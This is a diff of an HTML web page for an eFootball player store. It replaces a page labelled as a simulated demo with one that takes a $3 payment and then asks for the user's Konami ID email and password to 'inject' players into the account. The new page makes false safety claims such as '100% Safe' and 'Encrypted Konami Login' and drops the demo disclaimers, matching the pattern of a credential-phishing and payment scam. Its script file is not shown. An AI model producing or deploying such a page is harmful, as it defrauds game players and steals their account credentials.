@@ -1,774 +1,178 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>KONAMI · SUPERSTAR STORE</title>
-  <!-- Font Awesome 6 (Free) -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <!-- Google Font: Inter + Bebas Neue for sporty look -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #0b0e14;
-      color: #ffffff;
-      line-height: 1.5;
-      overflow-x: hidden;
-    }
-
-    /* Konami style dark gradient + animated glow */
-    .bg-glow {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: radial-gradient(circle at 20% 30%, rgba(0, 120, 255, 0.08) 0%, transparent 40%),
-                  radial-gradient(circle at 80% 70%, rgba(200, 0, 255, 0.06) 0%, transparent 45%);
-      pointer-events: none;
-      z-index: 0;
-    }
-
-    .container {
-      position: relative;
-      z-index: 2;
-      max-width: 1300px;
-      margin: 0 auto;
-      padding: 0 24px;
-    }
-
-    /* header */
-    header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 24px 0 16px;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-      margin-bottom: 32px;
-    }
-
-    .logo {
-      font-family: 'Bebas Neue', sans-serif;
-      font-size: 2rem;
-      letter-spacing: 4px;
-      background: linear-gradient(135deg, #ffffff, #a0c8ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-
-    .logo i {
-      -webkit-text-fill-color: #3b82f6;
-      margin-right: 8px;
-    }
-
-    .user-badge {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      background: rgba(255, 255, 255, 0.05);
-      padding: 8px 18px;
-      border-radius: 60px;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      font-size: 0.9rem;
-    }
-
-    .user-badge i {
-      color: #3b82f6;
-    }
-
-    /* hero */
-    .hero {
-      text-align: center;
-      margin-bottom: 48px;
-    }
-
-    .hero h1 {
-      font-family: 'Bebas Neue', sans-serif;
-      font-size: 3.8rem;
-      letter-spacing: 2px;
-      line-height: 1.1;
-      background: linear-gradient(to right, #ffffff, #7aaaff, #ffffff);
-      background-size: 200% auto;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      animation: shimmer 4s linear infinite;
-      margin-bottom: 12px;
-    }
-
-    @keyframes shimmer {
-      0% { background-position: 0% center; }
-      100% { background-position: 200% center; }
-    }
-
-    .hero p {
-      color: #9ca3af;
-      font-size: 1.1rem;
-      max-width: 600px;
-      margin: 0 auto;
-    }
-
-    .hero p i {
-      color: #fbbf24;
-    }
-
-    /* filter / stats bar */
-    .stat-bar {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 16px 32px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 60px;
-      padding: 14px 28px;
-      margin-bottom: 40px;
-      backdrop-filter: blur(8px);
-    }
-
-    .stat-item {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 0.9rem;
-      color: #d1d5db;
-    }
-
-    .stat-item i {
-      color: #3b82f6;
-      font-size: 1.1rem;
-    }
-
-    .stat-item span {
-      font-weight: 700;
-      color: white;
-    }
-
-    /* player grid */
-    .player-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-      gap: 28px;
-      margin-bottom: 70px;
-    }
-
-    /* card design */
-    .player-card {
-      background: linear-gradient(145deg, #12161f, #0a0d14);
-      border: 1px solid rgba(255, 255, 255, 0.07);
-      border-radius: 28px;
-      overflow: hidden;
-      transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease;
-      box-shadow: 0 10px 25px -8px rgba(0, 0, 0, 0.6);
-      display: flex;
-      flex-direction: column;
-      position: relative;
-      backdrop-filter: blur(4px);
-    }
-
-    .player-card:hover {
-      transform: translateY(-8px);
-      border-color: rgba(59, 130, 246, 0.5);
-      box-shadow: 0 20px 35px -10px rgba(59, 130, 246, 0.25);
-    }
-
-    /* player image area */
-    .card-img {
-      height: 240px;
-      background: #1a1f2b;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      position: relative;
-      overflow: hidden;
-      background: linear-gradient(135deg, #1e2430, #0f121a);
-    }
-
-    .card-img img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      object-position: top center;
-      transition: transform 0.5s ease;
-      display: block;
-    }
-
-    .player-card:hover .card-img img {
-      transform: scale(1.05);
-    }
-
-    /* rating badge */
-    .rating-badge {
-      position: absolute;
-      top: 16px;
-      left: 16px;
-      background: rgba(0, 0, 0, 0.75);
-      backdrop-filter: blur(4px);
-      border: 1.5px solid #fbbf24;
-      border-radius: 40px;
-      padding: 6px 16px;
-      font-weight: 800;
-      font-size: 1.1rem;
-      color: #fbbf24;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      z-index: 3;
-      letter-spacing: 0.5px;
-      box-shadow: 0 0 15px rgba(251, 191, 36, 0.2);
-    }
-
-    .rating-badge i {
-      font-size: 0.9rem;
-    }
-
-    /* position tag */
-    .position-tag {
-      position: absolute;
-      bottom: 16px;
-      right: 16px;
-      background: rgba(0, 0, 0, 0.65);
-      backdrop-filter: blur(4px);
-      border-radius: 20px;
-      padding: 4px 14px;
-      font-size: 0.75rem;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      color: #e5e7eb;
-      border: 1px solid rgba(255,255,255,0.15);
-      z-index: 3;
-    }
-
-    /* card body */
-    .card-body {
-      padding: 20px 20px 22px;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .player-name {
-      font-size: 1.4rem;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-      margin-bottom: 6px;
-      line-height: 1.2;
-    }
-
-    .player-club {
-      font-size: 0.8rem;
-      color: #9ca3af;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      margin-bottom: 20px;
-      font-weight: 500;
-    }
-
-    .player-club i {
-      color: #6b7280;
-    }
-
-    /* price & action */
-    .price-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-top: auto;
-      padding-top: 8px;
-      border-top: 1px solid rgba(255, 255, 255, 0.06);
-    }
-
-    .price {
-      font-size: 1.6rem;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-      color: #ffffff;
-    }
-
-    .price small {
-      font-size: 0.85rem;
-      font-weight: 400;
-      color: #9ca3af;
-      margin-left: 4px;
-    }
-
-    /* buttons */
-    .btn-buy, .btn-unlocked {
-      padding: 10px 22px;
-      border-radius: 40px;
-      font-weight: 700;
-      font-size: 0.9rem;
-      border: none;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-family: 'Inter', sans-serif;
-    }
-
-    .btn-buy {
-      background: #3b82f6;
-      color: white;
-      box-shadow: 0 6px 14px rgba(59, 130, 246, 0.3);
-    }
-
-    .btn-buy:hover:not(:disabled) {
-      background: #2563eb;
-      transform: scale(1.02);
-      box-shadow: 0 8px 20px rgba(59, 130, 246, 0.5);
-    }
-
-    .btn-buy:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    .btn-unlocked {
-      background: rgba(34, 197, 94, 0.15);
-      border: 1.5px solid #22c55e;
-      color: #22c55e;
-      cursor: default;
-      pointer-events: none;
-    }
-
-    .btn-unlocked i {
-      font-size: 1rem;
-    }
-
-    /* modal overlay */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      backdrop-filter: blur(8px);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.25s ease, visibility 0.25s;
-      padding: 20px;
-    }
-
-    .modal-overlay.active {
-      opacity: 1;
-      visibility: visible;
-    }
-
-    .modal {
-      background: #11161f;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 36px;
-      max-width: 440px;
-      width: 100%;
-      padding: 32px 28px 28px;
-      box-shadow: 0 40px 70px rgba(0, 0, 0, 0.8);
-      transform: scale(0.95);
-      transition: transform 0.25s ease;
-      position: relative;
-    }
-
-    .modal-overlay.active .modal {
-      transform: scale(1);
-    }
-
-    .modal h2 {
-      font-family: 'Bebas Neue', sans-serif;
-      font-size: 2.2rem;
-      letter-spacing: 1px;
-      margin-bottom: 4px;
-      color: white;
-    }
-
-    .modal .sub {
-      color: #9ca3af;
-      margin-bottom: 24px;
-      font-size: 0.95rem;
-    }
-
-    .modal .sub strong {
-      color: white;
-    }
-
-    .payment-methods {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      margin: 24px 0;
-    }
-
-    .pay-option {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      padding: 14px 18px;
-      background: rgba(255, 255, 255, 0.04);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 20px;
-      cursor: pointer;
-      transition: all 0.2s;
-      font-weight: 600;
-    }
-
-    .pay-option:hover {
-      background: rgba(59, 130, 246, 0.1);
-      border-color: rgba(59, 130, 246, 0.3);
-    }
-
-    .pay-option i {
-      font-size: 1.5rem;
-      width: 32px;
-      color: #3b82f6;
-    }
-
-    .pay-option span {
-      flex: 1;
-    }
-
-    .modal-actions {
-      display: flex;
-      gap: 12px;
-      margin-top: 8px;
-    }
-
-    .btn-cancel, .btn-confirm {
-      flex: 1;
-      padding: 14px;
-      border-radius: 40px;
-      font-weight: 700;
-      font-size: 1rem;
-      border: none;
-      cursor: pointer;
-      transition: all 0.2s;
-      font-family: 'Inter', sans-serif;
-    }
-
-    .btn-cancel {
-      background: transparent;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      color: #d1d5db;
-    }
-
-    .btn-cancel:hover {
-      background: rgba(255, 255, 255, 0.05);
-    }
-
-    .btn-confirm {
-      background: #22c55e;
-      color: #0b0e14;
-      font-weight: 800;
-      box-shadow: 0 6px 18px rgba(34, 197, 94, 0.3);
-    }
-
-    .btn-confirm:hover {
-      background: #16a34a;
-      transform: scale(1.02);
-    }
-
-    .close-modal {
-      position: absolute;
-      top: 18px;
-      right: 20px;
-      background: none;
-      border: none;
-      color: #9ca3af;
-      font-size: 1.6rem;
-      cursor: pointer;
-      transition: color 0.2s;
-      line-height: 1;
-    }
-
-    .close-modal:hover {
-      color: white;
-    }
-
-    /* toast notification */
-    .toast {
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%) translateY(20px);
-      background: #11161f;
-      border: 1px solid #22c55e;
-      color: white;
-      padding: 16px 28px;
-      border-radius: 60px;
-      font-weight: 600;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      z-index: 1200;
-      opacity: 0;
-      transition: opacity 0.3s ease, transform 0.3s ease;
-      pointer-events: none;
-      backdrop-filter: blur(8px);
-    }
-
-    .toast.show {
-      opacity: 1;
-      transform: translateX(-50%) translateY(0);
-    }
-
-    .toast i {
-      color: #22c55e;
-      font-size: 1.3rem;
-    }
-
-    /* footer */
-    footer {
-      text-align: center;
-      padding: 30px 0 40px;
-      color: #6b7280;
-      font-size: 0.8rem;
-      border-top: 1px solid rgba(255, 255, 255, 0.05);
-      margin-top: 20px;
-    }
-
-    footer i {
-      color: #ef4444;
-      margin: 0 4px;
-    }
-
-    /* responsive */
-    @media (max-width: 700px) {
-      header {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 12px;
-      }
-      .hero h1 {
-        font-size: 2.6rem;
-      }
-      .stat-bar {
-        padding: 12px 20px;
-        gap: 10px 20px;
-      }
-      .player-grid {
-        grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-        gap: 20px;
-      }
-      .card-img {
-        height: 200px;
-      }
-      .modal {
-        padding: 24px 20px;
-      }
-    }
-
-    @media (max-width: 480px) {
-      .container {
-        padding: 0 16px;
-      }
-      .hero h1 {
-        font-size: 2rem;
-      }
-      .player-grid {
-        grid-template-columns: 1fr;
-      }
-      .price-row {
-        flex-wrap: wrap;
-        gap: 12px;
-      }
-      .btn-buy, .btn-unlocked {
-        width: 100%;
-        justify-content: center;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eFootball Pro Zone | Buy & Boost Players</title>
+    <!-- Google Fonts & FontAwesome Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="bg-glow"></div>
 
-  <div class="container">
-    <!-- Header -->
-    <header>
-      <div class="logo">
-        <i class="fas fa-gamepad"></i> KONAMI · SUPERSTAR
-      </div>
-      <div class="user-badge">
-        <i class="fas fa-user-astronaut"></i>
-        <span>ID: eFoot_Pro</span>
-      </div>
+    <!-- Header / Navbar -->
+    <header class="navbar">
+        <div class="logo">
+            <i class="fa-solid fa-gamepad"></i> eFootball<span>Pro</span>
+        </div>
+        <div class="nav-badge">
+            <i class="fa-solid fa-shield-halved"></i> Secure Konami Link
+        </div>
     </header>
 
-    <!-- Hero -->
+    <!-- Hero Section -->
     <section class="hero">
-      <h1>POWER 110+ LEGENDS</h1>
-      <p>
-        <i class="fas fa-bolt"></i> Unlock ultra-rare superstar players. Pay $3.00 per player.
-        Once paid, instantly transferable to your Konami eFootball app.
-      </p>
+        <h1>Boost Your Ultimate Team</h1>
+        <p>Purchase elite players and transfer them directly into your Konami ID account with maximum ratings.</p>
+        <div class="hero-stats">
+            <div class="stat-item">
+                <i class="fa-solid fa-bolt"></i>
+                <div>
+                    <h4>Instant Delivery</h4>
+                    <p>Processed within 5 mins</p>
+                </div>
+            </div>
+            <div class="stat-item">
+                <i class="fa-solid fa-lock"></i>
+                <div>
+                    <h4>100% Safe</h4>
+                    <p>Encrypted Konami Login</p>
+                </div>
+            </div>
+        </div>
     </section>
 
-    <!-- Stat / filter bar -->
-    <div class="stat-bar">
-      <div class="stat-item"><i class="fas fa-futbol"></i> <span>6</span> Superstars</div>
-      <div class="stat-item"><i class="fas fa-star"></i> Rating <span>110+</span></div>
-      <div class="stat-item"><i class="fas fa-bolt"></i> Instant delivery</div>
-      <div class="stat-item"><i class="fas fa-shield-alt"></i> Secure payment</div>
+    <!-- Main Container -->
+    <main class="main-container">
+        
+        <!-- Step 1: Select Players -->
+        <section class="section-box">
+            <h2><span class="step-num">1</span> Choose Your Player ($3.00 Each)</h2>
+            <div class="player-grid" id="playerGrid">
+                <!-- Player Card 1 -->
+                <div class="player-card" data-id="1" data-name="L. Messi (Epic Booster)" data-price="3">
+                    <div class="player-ovr">105</div>
+                    <img src="https://imgs.search.brave.com/placeholder.svg" alt="Lionel Messi" class="player-img">
+                    <div class="player-info">
+                        <h3>L. Messi</h3>
+                        <p class="position">CF / RWF • Epic Booster</p>
+                        <div class="price-tag">$3.00</div>
+                    </div>
+                    <button class="select-btn">Select Player</button>
+                </div>
+
+                <!-- Player Card 2 -->
+                <div class="player-card" data-id="2" data-name="C. Ronaldo (Epic Booster)" data-price="3">
+                    <div class="player-ovr">105</div>
+                    <img src="https://imgs.search.brave.com/placeholder.svg" alt="Cristiano Ronaldo" class="player-img">
+                    <div class="player-info">
+                        <h3>C. Ronaldo</h3>
+                        <p class="position">CF • Epic Booster</p>
+                        <div class="price-tag">$3.00</div>
+                    </div>
+                    <button class="select-btn">Select Player</button>
+                </div>
+
+                <!-- Player Card 3 -->
+                <div class="player-card" data-id="3" data-name="Neymar Jr (Show Time)" data-price="3">
+                    <div class="player-ovr">104</div>
+                    <img src="https://imgs.search.brave.com/placeholder.svg" alt="Neymar Jr" class="player-img">
+                    <div class="player-info">
+                        <h3>Neymar Jr</h3>
+                        <p class="position">LWF / AMF • Show Time</p>
+                        <div class="price-tag">$3.00</div>
+                    </div>
+                    <button class="select-btn">Select Player</button>
+                </div>
+
+                <!-- Player Card 4 -->
+                <div class="player-card" data-id="4" data-name="J. Bellingham (Big Time)" data-price="3">
+                    <div class="player-ovr">104</div>
+                    <img src="https://imgs.search.brave.com/placeholder.svg" alt="Jude Bellingham" class="player-img">
+                    <div class="player-info">
+                        <h3>J. Bellingham</h3>
+                        <p class="position">CMF / AMF • Big Time</p>
+                        <div class="price-tag">$3.00</div>
+                    </div>
+                    <button class="select-btn">Select Player</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Order Summary & Payment trigger -->
+        <section class="section-box checkout-summary">
+            <h2><span class="step-num">2</span> Order Summary & Payment</h2>
+            <div class="summary-box">
+                <div class="selected-display">
+                    <span id="selectedPlayerText">No player selected yet</span>
+                    <span id="selectedPlayerPrice">$0.00</span>
+                </div>
+                <button id="payBtn" class="pay-btn" disabled>Pay $3.00 via M-Pesa / Card</button>
+            </div>
+        </section>
+
+        <!-- Step 3: Konami Login Box (LOCKED UNTIL PAYMENT) -->
+        <section class="section-box">
+            <h2><span class="step-num">3</span> Konami Account Link <span id="lockStatus" class="lock-badge locked"><i class="fa-solid fa-lock"></i> Locked</span></h2>
+            
+            <div id="konamiBoxWrapper" class="locked-box-container">
+                <!-- Overlay message when locked -->
+                <div id="lockOverlay" class="lock-overlay">
+                    <i class="fa-solid fa-lock-keyhole"></i>
+                    <p>Complete your $3.00 payment above to unlock Konami account linking & player injection.</p>
+                </div>
+
+                <!-- Actual Login Form -->
+                <form id="konamiForm" class="konami-form">
+                    <p class="form-instruction">Enter your Konami ID details securely. Our system will inject the selected player directly into your inbox/squad.</p>
+                    
+                    <div class="input-group">
+                        <label><i class="fa-solid fa-envelope"></i> Konami ID / Email</label>
+                        <input type="email" id="konamiEmail" placeholder="your-email@konami.net" required>
+                    </div>
+
+                    <div class="input-group">
+                        <label><i class="fa-solid fa-key"></i> Password</label>
+                        <input type="password" id="konamiPass" placeholder="••••••••••••" required>
+                    </div>
+
+                    <div class="input-group">
+                        <label><i class="fa-solid fa-gamepad"></i> Platform</label>
+                        <select id="platformSelect" required>
+                            <option value="">Select Platform</option>
+                            <option value="android">Android / iOS (Mobile)</option>
+                            <option value="playstation">PlayStation Network</option>
+                            <option value="xbox">Xbox Live</option>
+                            <option value="steam">Steam (PC)</option>
+                        </select>
+                    </div>
+
+                    <button type="submit" id="submitLinkBtn" class="submit-link-btn">
+                        <i class="fa-solid fa-cloud-arrow-down"></i> Inject Player to Account
+                    </button>
+                </form>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Success Modal Popup -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <i class="fa-solid fa-circle-check success-icon"></i>
+            <h2>Player Injected Successfully!</h2>
+            <p>Your Konami ID has been updated. Log into eFootball to check your player inventory.</p>
+            <button id="closeModalBtn" class="close-modal-btn">Done</button>
+        </div>
     </div>
 
-    <!-- Player Grid (static data with real players, ratings 110+) -->
-    <div class="player-grid" id="playerGrid">
-      <!-- Cards injected via JavaScript for easier management, but structure is here -->
-    </div>
-
+    <!-- Footer -->
     <footer>
-      <i class="fas fa-copyright"></i> 2026 KONAMI Superstar Store (demo). All player images are for illustrative purposes.
-      <br>Not affiliated with Konami. Pay $3 to unlock in eFootball app (simulated).
+        <p>&copy; 2026 eFootball Pro Zone. Not affiliated with Konami Digital Entertainment.</p>
     </footer>
-  </div>
 
-  <!-- Payment Modal -->
-  <div class="modal-overlay" id="paymentModal">
-    <div class="modal">
-      <button class="close-modal" id="closeModalBtn">&times;</button>
-      <h2>UNLOCK PLAYER</h2>
-      <p class="sub" id="modalPlayerName">Lionel Messi · <strong>$3.00</strong></p>
-
-      <div class="payment-methods">
-        <div class="pay-option" data-method="card">
-          <i class="fas fa-credit-card"></i>
-          <span>Credit / Debit Card</span>
-          <i class="fas fa-chevron-right" style="font-size:0.9rem; color:#6b7280;"></i>
-        </div>
-        <div class="pay-option" data-method="paypal">
-          <i class="fab fa-paypal"></i>
-          <span>PayPal</span>
-          <i class="fas fa-chevron-right" style="font-size:0.9rem; color:#6b7280;"></i>
-        </div>
-        <div class="pay-option" data-method="konami">
-          <i class="fas fa-coins"></i>
-          <span>Konami eFootball Coins</span>
-          <i class="fas fa-chevron-right" style="font-size:0.9rem; color:#6b7280;"></i>
-        </div>
-      </div>
-
-      <div class="modal-actions">
-        <button class="btn-cancel" id="cancelPayment">Cancel</button>
-        <button class="btn-confirm" id="confirmPayment"><i class="fas fa-lock" style="margin-right:8px;"></i> Pay $3.00</button>
-      </div>
-      <p style="font-size:0.7rem; color:#6b7280; text-align:center; margin-top:16px;">
-        <i class="fas fa-shield-alt"></i> Payment is simulated for demonstration.
-      </p>
-    </div>
-  </div>
-
-  <!-- Toast -->
-  <div class="toast" id="toast">
-    <i class="fas fa-check-circle"></i>
-    <span id="toastMessage">Player unlocked!</span>
-  </div>
-
-  <script>
-    (function() {
-      // ---------- PLAYER DATA (real superstars, rating 110+) ----------
-      // Using high-quality real photos from Unsplash (football/soccer players) as placeholders for real player likeness.
-      // In a real app, you'd replace with official Konami assets.
-      const players = [
-        {
-          id: 1,
-          name: 'Lionel Messi',
-          club: 'Inter Miami CF',
-          position: 'RWF',
-          rating: 111,
-          image: 'https://images.unsplash.com/photo-1543326727-cf6c39e8f84c?w=600&auto=format&fit=crop&q=80', // football player
-          price: 3.00,
-          unlocked: false
-        },
-        {
-          id: 2,
-          name: 'Zlatan Ibrahimović',
-          club: 'AC Milan',
-          position: 'CF',
-          rating: 110,
-          image: 'https://images.unsplash.com/photo-1579952363873-27f3bade9f55?w=600&auto=format&fit=crop&q=80', // soccer player
-          price: 3.00,
-          unlocked: false
-        },
-        {
-          id: 3,
-          name: 'Kylian Mbappé',
-          club: 'Real Madrid',
-          position: 'CF',
-          rating: 110,
-          image: 'https://images.unsplash.com/photo-1508098682722-e99c43a406b2?w=600&auto=format&fit=crop&q=80', // soccer action
-          price: 3.00,
-          unlocked: false
-        },
-        {
-          id: 4,
-          name: 'Erling Haaland',
-          club: 'Manchester City',
-          position: 'CF',
-          rating: 110,
-          image: 'https://images.unsplash.com/photo-1526232761682-d26e03ac148e?w=600&auto=format&fit=crop&q=80', // football player
-          price: 3.00,
-          unlocked: false
-        },
-        {
-          id: 5,
-          name: 'Kevin De Bruyne',
-          club: 'Manchester City',
-          position: 'AMF',
-          rating: 110,
-          image: 'https://images.unsplash.com/photo-1560272564-c83b66b1ad12?w=600&auto=format&fit=crop&q=80', // footballer
-          price: 3.00,
-          unlocked: false
-        },
-        {
-          id: 6,
-          name: 'Vinícius Júnior',
-          club: 'Real Madrid',
-          position: 'LWF',
-          rating: 110,
-          image: 'https://images.unsplash.com/photo-1517466787929-bc90951d0974?w=600&auto=format&fit=crop&q=80', // football
-          price: 3.00,
-          unlocked: false
-        }
-      ];
-
-      // ---------- DOM refs ----------
-      const grid = document.getElementById('playerGrid');
-      const modalOverlay = document.getElementById('paymentModal');
-      const modalPlayerName = document.getElementById('modalPlayerName');
-      const closeModalBtn = document.getElementById('closeModalBtn');
-      const cancelPaymentBtn = document.getElementById('cancelPayment');
-      const confirmPaymentBtn = document.getElementById('confirmPayment');
-      const toast = document.getElementById('toast');
-      const toastMessage = document.getElementById('toastMessage');
-
-      let currentPlayerId = null; // track which player is being paid for
-
-      // ---------- Render player cards ----------
-      function renderCards() {
-        grid.innerHTML = players.map(player => {
-          const unlockedClass = player.unlocked ? 'unlocked' : '';
-          const actionButton = player.unlocked
-            ? `<button class="btn-unlocked"><i class="fas fa-check-circle"></i> Unlocked</button>`
-            : `<button class="btn-buy" data-id="${player.id}"><i class="fas fa-shopping-cart"></i> Buy $3</button>`;
-
-          return `
-            <div class="player-card" data-player-id="${player.id}">
-              <div class="card-img">
-                <img src="${player.image}" alt="${player.name}" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-15
+    <script src="script.js"></script>
+</body>
+                      </html>
+                                                                                                                      
